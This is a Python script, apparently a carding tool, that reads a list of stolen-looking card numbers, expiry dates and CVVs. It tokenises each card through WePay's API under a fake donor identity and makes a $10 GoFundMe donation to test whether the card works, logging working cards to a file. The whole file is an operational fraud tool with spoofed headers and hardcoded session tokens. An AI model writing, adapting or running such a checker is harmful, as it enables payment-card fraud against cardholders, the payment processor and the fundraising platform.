#!usr/bin/python2
# Code by MeC505
import json
import requests
import token
import os

def tok(c1, cvv1, m1, y1):
	header ={
		"Host": "www.wepayapi.com",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
		"Accept": "*/*",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate, br",
		"Referer": "https://www.wepayapi.com/api/messenger",
		"Content-Type": "application/json",
		"X-Requested-With": "XMLHttpRequest",
		"Content-Length": "369",
		"DNT": "1",
		"Connection": "keep-alive" }

	data = {
		"client_id":"90823",
		"cc_number":c1,
		"cvv":cvv1,"expiration_month":m1,
		"expiration_year":y1,
		"user_name":"crook george",
		"email":"george.crook14@gmail.com",
		"address":{"address1":' ',"city":' ',"region":" ","country":"US","postal_code":"32024"},
		"reference_id":"064b696a983e5c4ff5b98db43e251fd2981acbd6",
		"device_token":"608b2061-c910-4e10-bc19-ee5b1279c37a" }

	global ids
	#print(data)
	url = "https://www.wepayapi.com/v2/credit_card/create"
	resp = requests.post(url, headers=header, json=data)
	son = resp.text
	idy = json.loads(son)
	ids = idy["credit_card_id"]
	status = idy["state"]
	print("Credit card id:",ids,"status",status)

	return ids

def check_live():
	path = os.getcwd()
	hid = {
		"Host": "www.gofundme.com",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
		"Accept": "*/*",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate, br",
		"Referer": "https://www.gofundme.com/f/help-dakie-pass-the-bypass/donate",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		"X-Requested-With": "XMLHttpRequest",
		"Content-Length": "1090",
		"DNT": "1",
		"Connection": "keep-alive"
		}

	laman = "donationAmount=10&donationTipAmount=1&donationAnonymous=&donorFirstName=crook&donorLastName=george&donorEmail=george.crook14%40gmail.com&donorAddressStreet=&donorAddressStreet2=&donorAddressCity=LAKE+CITY&donorAddressState=&donorAddressRegion=&donorAddressCountryCode=US&donorAddressZip=32024&donorAddressPostcode=&emailList=&donationTipOtherAmount=&entered_zip=32024+-+Lake+City%2C+FL&teamMemberId=0&gfm_idcode=2067f55f68fff0ed1a2ae6eefee7cd3d&fingerprints=%7B%22fingerprints%22%3A%5B%222067f55f68fff0ed1a2ae6eefee7cd3d%22%5D%2C%22userAgent%22%3A%22Mozilla%2F5.0+(X11%3B+Linux+x86_64%3B+rv%3A60.0)+Gecko%2F20100101+Firefox%2F60.0%22%7D&_token=1d8559b30676003109f201370930f778&billingCcExpiration=&reference_id=064b696a983e5c4ff5b98db43e251fd2981acbd6&fundId=41265758&ccInfo%5Bcredit_card_id%5D={}&ccInfo%5Bstate%5D=new&persistShortTermToken=false&savedToken=false&Donations=true&FBLogin%5Buid%5D=&FBLogin%5Btoken%5D=&content=&gfmFlow=d_ab_c1h&Comments%5Btext%5D=&donationtier_id=&credit_card_number=9993&credit_card_type=visa&sid=1xxOis%2FJYg%2B0I5ho3pnDeX%2BvCcj5vJkUsbXBnTQADp4%3D".format(ids)
	url = "https://www.gofundme.com/mvc.php?route=customcheckout/customCheckout"
	resp = requests.post(url, headers=hid, data=laman)
	son = resp.text
	result = json.loads(son)

	if result["success"] == True:
		print("success:", result["success"])
		print("payment:", result["error"])
		print("====================================================>")
		s = open(path+"/success.txt", "a")
		s.write(c1)
        	s.write("|")
        	mm = str(m1)
        	s.write(mm)
        	s.write("|")
        	yy = str(y1)
        	s.write(yy)
        	s.write("|")
        	s.write(cvv1)
        	s.write("\n")
	else:
		print("success:", result["success"])
		print("payment:", result["error"])
		print("====================================================>")

	return result

def main():
	global c1
	global cvv1
	global m1
	global y1
	path = os.getcwd()
	cc = open(path+"/valid.txt", "r")
	for i in cc:
		c = ""
		cvv = ""
		m = ""
		y = ""

		c1 = ""
		m1 = 0
		y1 = 0
		cvv1 = ""

		for x in range(0, 16):
			c += i[x]
		for x in range(17, 19):
			m += i[x]
		for x in range(20, 24):
			y += i[x]
		for x in range(25, 28):
			cvv += i[x]

		c1 += c
		cvv1 += cvv
		m1 += int(m)
		y1 += int(y)

		toks = tok(c1, cvv1, m1, y1)

		if toks:
			check_live()
		else:
			check_live()

if __name__ == "__main__":
	main()

else:
	main()
